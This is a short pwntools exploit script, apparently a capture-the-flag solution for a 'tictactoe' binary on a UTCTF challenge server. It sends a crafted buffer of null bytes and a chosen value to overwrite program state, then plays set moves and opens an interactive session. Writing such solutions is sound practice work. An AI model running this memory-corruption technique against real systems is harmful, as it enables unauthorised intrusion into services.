#!/usr/bin/env python3

from pwn import *

exe = ELF("./tictactoe")

context.binary = exe

gdb_script = '''
b *main
b *main+0x04aa
b *main+2324
b *main+2811
b *main+2831
c
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
		
    else:
        r = remote("challenge.utctf.live", 7114)

    return r


def main():
    r = conn()
    
    null = b"\x00\x00\x00\x00"
    
    # filling with null bytes to bypass rax sigsev
    r.sendline(b"x" + null*15 + b"\x01\x00\x00\x00" + null)
    
    r.sendline("5")
    r.sendline("3")
    r.sendline("4")
    r.sendline("8")
    
    r.interactive()


if __name__ == "__main__":
    main()
